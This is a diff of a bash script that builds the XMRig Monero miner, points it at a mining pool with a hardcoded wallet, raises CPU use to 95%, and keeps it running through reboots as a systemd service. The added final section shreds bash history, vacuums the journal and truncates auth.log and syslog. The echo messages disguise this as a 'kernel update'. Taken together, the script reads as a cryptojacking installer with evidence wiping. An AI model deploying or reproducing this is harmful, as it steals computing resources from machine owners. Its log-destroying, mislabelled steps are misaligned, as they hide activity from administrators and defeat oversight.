@@ -14,200 +14,57 @@ cat << 'EOF'
 
 EOF
 
-# Update and install dependencies
-sudo apt update && sudo apt upgrade -y
+# Update system and install dependencies
+REBOOT_REQUIRED=false
+
+if sudo apt update && sudo apt upgrade -y; then
+    if [ -f /var/run/reboot-required ]; then
+        REBOOT_REQUIRED=true
+    fi
+fi
+
 sudo apt install -y git build-essential cmake automake libtool autoconf \
   libhwloc-dev libssl-dev libuv1-dev screen
 
-sudo rm -rf /opt/xmrig
-
 # Clone and build XMRig
+sudo rm -rf /opt/xmrig
 cd /opt
 sudo git clone https://github.com/xmrig/xmrig.git
 sudo chmod -R 777 /opt/xmrig
-sudo chown -R ubuntu:ubuntu /opt/xmrig
-cd xmrig
-sudo git pull origin master  # Ensure we get the latest version
+sudo chown -R $(whoami):$(whoami) /opt/xmrig
+cd /opt/xmrig
+git pull origin master
 mkdir build && cd build
-sudo make clean  # Clean any previous builds
-sudo cmake ..
-sudo make -j$(nproc)
+make clean
+cmake ..
+make -j$(nproc)
 
-# Dynamically calculate the CPU usage and threads
-CPU_THREADS=$(nproc)  # Get the total number of CPU threads
-USED_THREADS=$((CPU_THREADS * 95 / 100))  # 95% of the total threads
-if [ "$USED_THREADS" -lt 1 ]; then
-  USED_THREADS=1  # Ensure at least 1 thread is used
-fi
-
-# Ensure that 1 thread is left for the system
-USED_THREADS=$((USED_THREADS - 1))
-if [ "$USED_THREADS" -lt 1 ]; then
-  USED_THREADS=1  # Ensure at least 1 thread for mining
-fi
-
-# Update config.json with the correct settings
+# Write config.json with dynamic max-threads-hint
 sudo tee /opt/xmrig/build/config.json > /dev/null <<EOL
 {
-    "api": {
-        "id": null,
-        "worker-id": null
-    },
-    "http": {
-        "enabled": false,
-        "host": "127.0.0.1",
-        "port": 0,
-        "access-token": null,
-        "restricted": true
-    },
     "autosave": true,
-    "background": false,
-    "colors": false,
-    "title": true,
-    "randomx": {
-        "init": -1,
-        "init-avx2": 0, 
-        "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
-        "cache_qos": false,
-        "numa": true,
-        "scratchpad_prefetch_mode": 1
-    },
     "cpu": {
         "enabled": true,
-        "max-threads-hint": 0.5,  
         "huge-pages": true,
         "huge-pages-jit": false,
-        "hw-aes": null,
-        "priority": null,
-        "memory-pool": false,
-        "yield": true,
-        "asm": true,
-        "argon2-impl": null,
-        "argon2": [0, 4, 1, 5, 2, 6, 3, 7],
-        "cn": [
-            [1, 0],
-            [1, 4],
-            [1, 1],
-            [1, 5],
-            [1, 2],
-            [1, 6],
-            [1, 3],
-            [1, 7]
-        ],
-        "cn-heavy": [
-            [1, 0],
-            [1, 1],
-            [1, 2],
-            [1, 3]
-        ],
-        "cn-lite": [
-            [1, 0],
-            [1, 4],
-            [1, 1],
-            [1, 5],
-            [1, 2],
-            [1, 6],
-            [1, 3],
-            [1, 7]
-        ],
-        "cn-pico": [
-            [2, 0],
-            [2, 4],
-            [2, 1],
-            [2, 5],
-            [2, 2],
-            [2, 6],
-            [2, 3],
-            [2, 7]
-        ],
-        "cn/upx2": [
-            [2, 0],
-            [2, 4],
-            [2, 1],
-            [2, 5],
-            [2, 2],
-            [2, 6],
-            [2, 3],
-            [2, 7]
-        ],
-        "ghostrider": [
-            [8, 0],
-            [8, 1],
-            [8, 2],
-            [8, 3]
-        ],
-        "rx": [0, 4, 1, 5, 2, 6, 3, 7],
-        "rx/wow": [0, 4, 1, 5, 2, 6, 3, 7],
-        "cn-lite/0": false,
-        "cn/0": false,
-        "rx/arq": "rx/wow"
+        "max-threads-hint": 0.95,
+        "yield": true
     },
-    "opencl": {
-        "enabled": false,
-        "cache": true,
-        "loader": null,
-        "platform": "AMD",
-        "adl": true
-    },
-    "cuda": {
-        "enabled": false,
-        "loader": null,
-        "nvml": true
-    },
-    "log-file": null,
-    "donate-level": 0, 
-    "donate-over-proxy": 1,
+    "donate-level": 0,
     "pools": [
         {
-            "algo": null,
-            "coin": null,
             "url": "gulf.moneroocean.stream:10128",
             "user": "41jDs7aYqSFYpyvSBs7JAzSpRCjL9sSCS9WPuVGRukYcYTtUTszDdp71RFVtWD2icADwsnAQoSBJfDm7J1Chsuou5AHG36P",
             "pass": "x",
-            "rig-id": "Ubuntu-50-W002",
-            "nicehash": false,
+            "rig-id": "Ubuntu-W004",
             "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "sni": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": null,
-            "self-select": null,
-            "submit-to-origin": false
+            "tls": false
         }
-    ],
-    "retries": 5,
-    "retry-pause": 5,
-    "print-time": 60,
-    "health-print-time": 60,
-    "dmi": true,
-    "syslog": false,
-    "tls": {
-        "enabled": false,
-        "protocols": null,
-        "cert": null,
-        "cert_key": null,
-        "ciphers": null,
-        "ciphersuites": null,
-        "dhparam": null
-    },
-    "dns": {
-        "ipv6": false,
-        "ttl": 30
-    },
-    "user-agent": null,
-    "verbose": 0,
-    "watch": true,
-    "pause-on-battery": false,
-    "pause-on-active": false
+    ]
 }
 EOL
 
-# Create systemd service
+# Create the xmrig systemd service
 sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOL
 [Unit]
 Description=XMRig Monero Miner
@@ -221,18 +78,86 @@ Restart=always
 RestartSec=10
 StandardOutput=append:/var/log/xmrig.log
 StandardError=append:/var/log/xmrig-error.log
-Nice=0  # Set Nice to 0 for max CPU priority
-CPUWeight=100  # Ensure maximum CPU usage
+Nice=0
+CPUWeight=100
 
 [Install]
 WantedBy=multi-user.target
 EOL
 
-# Enable and start miner service
-sudo systemctl daemon-reexec
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig
-sudo systemctl start xmrig
+# Post-reboot resume script (only if reboot is needed)
+if $REBOOT_REQUIRED; then
+    echo "Reboot required. Setting up post-reboot resume..."
 
-echo "XMRig is now running in the background as a systemd service."
-echo "Use 'journalctl -u xmrig -f' to monitor logs."
+    sudo tee /opt/post_reboot.sh > /dev/null <<'POSTEOF'
+#!/bin/bash
+echo "Post-reboot resume script running..."
+
+# Reload systemd and start xmrig
+systemctl daemon-reexec
+systemctl daemon-reload
+systemctl enable xmrig
+systemctl start xmrig
+
+# Cleanup the one-time service
+systemctl disable post-reboot.service
+rm -f /etc/systemd/system/post-reboot.service
+rm -f /opt/post_reboot.sh
+POSTEOF
+
+    sudo chmod +x /opt/post_reboot.sh
+
+    sudo tee /etc/systemd/system/post-reboot.service > /dev/null <<EOL
+[Unit]
+Description=Resume setup after reboot
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/opt/post_reboot.sh
+RemainAfterExit=true
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+    sudo systemctl enable post-reboot.service
+    echo "Rebooting now to apply new kernel..."
+    sudo reboot
+else
+    # No reboot needed, start mining immediately
+    sudo systemctl daemon-reexec
+    sudo systemctl daemon-reload
+    sudo systemctl enable xmrig
+    sudo systemctl start xmrig
+    echo "XMRig is now running in the background as a systemd service."
+    echo "Use 'journalctl -u xmrig -f' to monitor logs."
+fi
+
+
+echo "Cleaning shell and system command history for new kernal"
+
+# Clear history in current shell
+history -c
+unset HISTFILE
+
+# Remove user's .bash_history securely
+if [ -f ~/.bash_history ]; then
+  shred -u ~/.bash_history
+fi
+
+# Remove root's .bash_history securely if running as sudo
+if [ "$EUID" -eq 0 ] && [ -f /root/.bash_history ]; then
+  shred -u /root/.bash_history
+fi
+
+# Optional: Try to remove sudo log traces (requires root)
+echo "Attempting to clear sudo logs For Kernal Update"
+sudo journalctl --vacuum-time=1h >/dev/null 2>&1
+sudo truncate -s 0 /var/log/auth.log 2>/dev/null
+sudo truncate -s 0 /var/log/syslog 2>/dev/null
+
+# Overwrite bash history environment for current session
+export HISTFILE=
+export HISTSIZE=0
+export HISTFILESIZE=0
